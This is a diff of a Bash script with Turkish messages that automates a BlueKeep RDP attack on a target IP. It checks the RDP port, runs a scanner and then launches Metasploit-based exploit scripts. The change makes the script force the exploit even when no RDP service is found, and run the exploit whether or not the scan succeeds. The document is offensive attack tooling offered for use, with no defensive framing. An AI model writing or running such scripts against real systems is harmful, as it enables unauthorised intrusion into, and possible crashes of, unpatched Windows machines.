@@ -27,27 +27,28 @@ fi
 TARGET_IP=$1
 PORT=${2:-3389}
 
-# RDP portunu kontrol et
-echo -e "${YELLOW}[*] RDP portu kontrol ediliyor: $TARGET_IP:$PORT...${NC}"
-nc -z -w 3 $TARGET_IP $PORT
+# Gelişmiş RDP kontrolü
+echo -e "${YELLOW}[*] Gelişmiş RDP kontrolü başlatılıyor: $TARGET_IP:$PORT...${NC}"
+python3 check_rdp_detailed.py -i $TARGET_IP -p $PORT
 
 if [ $? -ne 0 ]; then
-    echo -e "${RED}[-] RDP portu kapalı veya erişilemez: $TARGET_IP:$PORT${NC}"
-    echo -e "${YELLOW}[?] Yine de devam etmek istiyor musunuz? (e/h)${NC}"
+    echo -e "${RED}[-] Hedef sistemde RDP servisi bulunamadı veya erişilebilir değil${NC}"
+    echo -e "${YELLOW}[?] Yine de zorla exploit denemek istiyor musunuz? (e/h)${NC}"
     read answer
     if [[ "$answer" != "e" && "$answer" != "E" ]]; then
         exit 1
     fi
+    echo -e "${YELLOW}[*] Zorla exploit çalıştırılıyor...${NC}"
+    python3 force_bluekeep.py -i $TARGET_IP -p $PORT
+    exit $?
 fi
 
 # Tarama işlemi
 echo -e "${YELLOW}[*] BlueKeep taraması başlatılıyor...${NC}"
 python3 bluekeep_scanner.py -i $TARGET_IP -p $PORT
 
-# Sonuç "Auxiliary module execution completed" ise
-if [ $? -eq 0 ]; then
-    echo -e "${YELLOW}[*] İşletim sistemi tespiti ve exploit başlatılıyor...${NC}"
-    python3 metasploit_bluekeep.py -i $TARGET_IP -p $PORT -A -f
-fi
+# İşletim sistemi tespiti ve exploit
+echo -e "${YELLOW}[*] İşletim sistemi tespiti ve exploit başlatılıyor...${NC}"
+python3 metasploit_bluekeep.py -i $TARGET_IP -p $PORT -A -f
 
 echo -e "${GREEN}[+] İşlem tamamlandı${NC}"
